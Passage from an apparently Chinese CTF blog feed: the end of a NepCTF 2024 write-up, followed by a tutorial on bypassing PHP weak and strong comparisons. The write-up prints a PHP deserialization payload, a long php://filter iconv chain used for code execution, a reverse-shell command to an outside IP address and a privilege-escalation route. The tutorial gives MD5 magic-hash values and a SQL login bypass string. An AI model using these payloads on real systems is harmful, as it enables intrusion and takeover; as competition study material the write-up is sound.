markdown">?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;&amp;nep1=%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep=Nep<br></code></pre></td></tr></table></figure><p>post传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php<br></code></pre></td></tr></table></figure><p>最后通过<code>?cmd=system(&#39;env&#39;);</code>得到flag</p><p><img src="/../../images/nepctf/2024/php4.png" alt="php4"></p><h2 id="蹦蹦炸弹（boom-it）"><a href="#蹦蹦炸弹（boom-it）" class="headerlink" title="蹦蹦炸弹（boom_it）"></a>蹦蹦炸弹（boom_it）</h2><p>审计一下代码，直接给了secret_key,用户是HRP，flask伪造session</p><p><img src="/../../images/nepctf/2024/boom1.png" alt="boom1"></p><p>随便写个前端上传个文件再修改一下内容为..&#x2F;..&#x2F;lock.txt</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://neptune-29348.nepctf.lemonprefect.cn/admin/dashboard&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>只有就有File uploaded successfully</p><p>然后改回GET，尝试?cmd&#x3D;ls</p><p><img src="/../../images/nepctf/2024/boom2.png" alt="boom2"></p><p>尝试读取flag发现并不能读取，发现start.sh可写入，尝试反弹shell</p><p><code>?cmd=echo+&quot;bash+-i+&gt;%26+/dev/tcp/8.130.42.113/8888+0&gt;%261&quot;+&gt;+start.sh</code></p><p><code>?cmd=bash+start.sh</code></p><p>进去发现是root权限才能读出</p><p><img src="/../../images/nepctf/2024/boom3.png" alt="boom3"></p><p>执行命令<code>ps -aux</code></p><p>可以看到一个<code>/usr/sbin/xinetd</code>是由root权限得到的</p><p>查看<code>etc/xinetd.d/</code>看到pwnservice里面有个端口8888,并且这个可以写入，可以尝试利用8888进行连接</p><p>这里继续看晨曦师傅的wp</p><p>我是需要<code>echo &quot;./pwn;chmod 777 /home/ctfuser/*&quot; &gt;&gt; /home/ctfuser/start.sh&quot;</code>这里改为最大权限</p><p>然后nc 127.0.0.1 8888,(<code>python3 -c &quot;import socket;sock = socket.socket();sock.connect((&#39;127.0.0.1&#39;, 8888));&quot;</code>)随后<code>ls -al</code>可以发现flag是可以打开的了，可以cat flag</p><p><img src="/../../images/nepctf/2024/boom4.png" alt="boom4"></p><hr><p>复盘就到这了，剩下的有些知识点确实完全不知道，等下学期好好恶补一下，第一次打nep学到了很多东西。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>Misc</tag>
      
      <tag>serialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basectf2024</title>
    <link href="/2024/08/21/basectf/basectf2024/"/>
    <url>/2024/08/21/basectf/basectf2024/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3e32c0bcbce1d8a5451293c4c2714a1e06b079798a87bd2e899f26a4a4953d7f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出PHP强弱比较</title>
    <link href="/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/"/>
    <url>/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/</url>
    
    <content type="html"><![CDATA[<p>鉴于最近打的一个比赛，来了解一下ctf中经常出现的弱等于强等于的问题</p><h2 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h2><h3 id="Q1-二者弱比教"><a href="#Q1-二者弱比教" class="headerlink" title="Q1:二者弱比教"></a>Q1:二者弱比教</h3><p>这部分内容自己检索，简要的说<code>==</code>的情况下，左右两边的类型会进行转化。</p><p>举个例子来说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>&amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如题，需要我们传入的内容不一样，但是MD5加密之后需要相同</p><p>常见的做法有两种</p><p>方法一：</p><p>弱比教数组绕过，payload如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><p>先进行数组的比较，1！&#x3D;2，再md5加密，对于对数组的加密，默认是Null，两者加密之后相同</p><p>方法二：</p><p>常见的知识积累</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a=240610708&amp;b=s214587387a0<br></code></pre></td></tr></table></figure><p>原理是两者MD5加密之后开头都是0e，在php语言中，0e会在php解释为0</p><p>以下是常见的一些</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a0<br></code></pre></td></tr></table></figure><p>sha1的弱比教类比上面的内容</p><h3 id="Q2-自身弱比教"><a href="#Q2-自身弱比教" class="headerlink" title="Q2:自身弱比教"></a>Q2:自身弱比教</h3><p>例题如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$a</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只需要md5加密之后等于自己就行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a=0e215962017<br></code></pre></td></tr></table></figure><p>做下记录就行</p><h3 id="Q3-登入用户Md5-万能密码"><a href="#Q3-登入用户Md5-万能密码" class="headerlink" title="Q3:登入用户Md5(万能密码)"></a>Q3:登入用户Md5(万能密码)</h3><p>这个常见于登陆界面</p><p>可以参考这个文章，<a href="https://blog.csdn.net/qq_44879989/article/details/133363370">文章</a></p><p><code>ffifdyop</code> 经过两次转化后得到的结果是 <code>&#39;or&#39;6�]��!r,��b</code>。位于 <code>or</code> 两侧的单引号可以用于闭合两端的单引号，使得 <code>or</code> 不再被 MySQL 认为是字符串，而是一个关键字，发挥着 <code>逻辑或运算符</code> 的作用。</p><h3 id="Q4-Md5双层嵌套"><a href="#Q4-Md5双层嵌套" class="headerlink" title="Q4:Md5双层嵌套"></a>Q4:Md5双层嵌套</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">md5(md5($a))==md5($a)<br></code></pre></td></tr></table></figure><p>列举几个例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure><p>可本地自己测试</p><h2 id="PHP强类型"><a href="#PHP强类型" class="headerlink" title="PHP强类型"></a>PHP强类型</h2><h3 id="Q1-二者强比较"><a href="#Q1-二者强比较" class="headerlink" title="Q1:二者强比较"></a>Q1:二者强比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>&amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以用数组进行绕过</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><h3 id="Q2-二者强比较-类限制"><a href="#Q2-二者强比较-类限制" class="headerlink" title="Q2:二者强比较(类限制)"></a>Q2:二者强比较(类限制)</h3><p>当限制在类中无法利用数组，可以尝试md5碰撞，这里推荐工具fastcoll</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/1.png" alt="1"></p><p>然后工具执行</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/2.png" alt="2"></p><p>接下来写一个例题就行比较一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;C:\Users\30226\Desktop\ctftool\tools\fastcoll\1.txt&quot;</span>);<br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;C:\Users\30226\Desktop\ctftool\tools\fastcoll\2.txt&quot;</span>);<br><br><span class="hljs-variable">$aa</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$bb</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$aa</span>===<span class="hljs-variable">$bb</span>)<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;erro&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$aaa</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$aaa</span>===<span class="hljs-variable">$bbb</span>)<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;erro&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/3.png" alt="3"></p><h3 id="Q3-MD5和sha1强比较"><a href="#Q3-MD5和sha1强比较" class="headerlink" title="Q3:MD5和sha1强比较"></a>Q3:MD5和sha1强比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cianiao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$var1</span>, <span class="hljs-variable">$var2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$var1</span> = <span class="hljs-variable">$var1</span>;<br>        <span class="hljs-variable">$var2</span> = <span class="hljs-variable">$var2</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var2);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;var1 != <span class="hljs-variable language_">$this</span>-&gt;var2) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var2)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;var1) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;var2))) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;var1);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里可以利用php的EXCEPTION异常类进行绕过，exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 